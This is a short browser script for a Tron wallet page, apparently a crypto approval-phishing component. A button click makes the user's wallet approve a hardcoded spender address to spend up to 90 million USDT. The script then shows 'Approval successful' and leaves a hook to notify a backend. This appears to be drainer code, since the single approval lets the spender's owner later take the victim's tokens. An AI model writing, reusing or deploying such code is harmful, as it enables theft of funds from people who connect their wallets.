// public/js/approve.js

window.addEventListener("DOMContentLoaded", () => {
  const approveBtn = document.getElementById("approve-usdt-btn");

  if (approveBtn) {
    approveBtn.addEventListener("click", async () => {
      if (!window.tronWeb || !window.tronWeb.ready) {
        alert("Please connect your Tron wallet first.");
        return;
      }

      try {
        const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
        const spender = "TWmodUdsr2uiSsycXWUE53Ctw2xUzY6vN8";
        const amount = 90_000_000 * 1_000_000; // USDT uses 6 decimals

        const contract = await window.tronWeb.contract().at(usdtContractAddress);

        const tx = await contract.approve(spender, amount).send({
          feeLimit: 10_000_000
        });

        alert("✅ Approval successful!");
        console.log("TX Hash:", tx);

        // Optionally POST to your Flask backend here

      } catch (error) {
        console.error(error);
        alert("❌ Approval failed: " + error.message);
      }
    });
  }
});
